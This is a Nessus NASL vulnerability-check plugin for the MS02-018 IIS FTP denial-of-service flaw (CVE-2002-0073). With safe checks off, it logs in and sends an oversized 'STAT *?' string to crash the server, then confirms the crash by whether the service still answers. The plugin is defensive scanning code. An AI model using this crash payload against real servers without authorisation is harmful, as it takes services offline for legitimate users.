#
# (C) Tenable Network Security, Inc.
#

# Thanks to: H D Moore

include("compat.inc");

if(description)
{
 script_id(10934);
 script_version ("$Revision: 1.32 $");

 script_cve_id("CVE-2002-0073");
 script_bugtraq_id(4482);
 script_xref(name:"IAVA", value:"2002-A-0002");
 script_xref(name:"OSVDB", value:"3328");
 
 script_name(english:"MS02-018: Microsoft IIS FTP Status Request DoS (uncredentialed check)");
 script_summary(english:"Tries to crash the remote service");
 
 script_set_attribute(
  attribute:"synopsis",
  value:"The remote FTP server is prone to a denial of service attack."
 );
 script_set_attribute(
  attribute:"description", 
  value:string(
   "It was possible to make the remote FTP server crash by sending the\n",
   "command 'STAT *?AAAAA....AAAAA'. \n",
   "\n",
   "There is a bug in certain versions of Microsoft's FTP server that can be\n",
   "exploited in this fashion.  Other FTP servers may also react adversely\n",
   "to such a string.  An attacker may leverage this issue to crash the\n",
   "affected service and deny usage to legitimate users."
  )
 );
 script_set_attribute(
  attribute:"solution", 
  value:string(
   "If using Microsoft's FTP server, see :\n",
   "\n",
   "http://www.microsoft.com/technet/security/bulletin/ms02-018.mspx\n",
   "\n",
   "Otherwise contact the vendor for a patch."
  )
 );
 script_set_attribute(
  attribute:"cvss_vector", 
  value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P"
 );
 script_end_attributes();
 
 script_category(ACT_DENIAL);
 script_family(english:"FTP");
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
		  
 script_dependencies("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl", "iis_asp_overflow.nasl", "ftp_kibuv_worm.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here : 
#

include("ftp_func.inc");
include("global_settings.inc");

if (report_paranoia < 2) exit(0);

if ( get_kb_item("Q319733") ) exit(0);

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(! get_port_state(port)) exit(0);
if (get_kb_item('ftp/'+port+'/broken') || 
    get_kb_item('ftp/'+port+'/backdoor')) exit(0);

if(!safe_checks())
{
 login = get_kb_item("ftp/login");
 password = get_kb_item("ftp/password");
 if(login)
 {
 # Connect to the FTP server
  soc = open_sock_tcp(port);
  if(soc)
  {  
  if(ftp_authenticate(socket:soc, user:login, pass:password))
  {
     # We are in
     c = string("STAT *?", crap(240), "\r\n");
     send(socket:soc, data:c);
     b = ftp_recv_line(socket:soc);
     send(socket:soc, data:string("HELP\r\n"));
     r = ftp_recv_line(socket:soc);
     if(!r)security_warning(port);
     else {
     ftp_close(socket: soc);
     }
    exit(0);
   }
  }
 }
}
